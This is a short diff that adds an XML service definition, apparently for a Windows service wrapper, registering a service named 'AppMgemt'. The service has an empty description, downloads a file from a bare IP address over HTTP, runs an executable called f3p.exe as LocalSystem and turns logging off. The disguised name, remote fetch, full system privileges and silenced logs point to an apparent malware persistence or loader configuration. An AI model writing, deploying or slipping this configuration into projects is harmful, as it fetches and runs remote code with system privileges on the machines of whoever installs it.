@@ -1,0 +1,12 @@
+<service>
+    <id>AppMgemt</id>
+    <name>AppMgemt</name>
+    <description></description>
+    <download from="http://82.156.199.36/zz" to="%BASE%\zz" />
+    <executable>"%BASE%\f3p.exe"</executable>
+    <arguments></arguments>
+    <serviceaccount>
+      <username>LocalSystem</username>
+    </serviceaccount>
+    <log mode="none"/>
+</service>
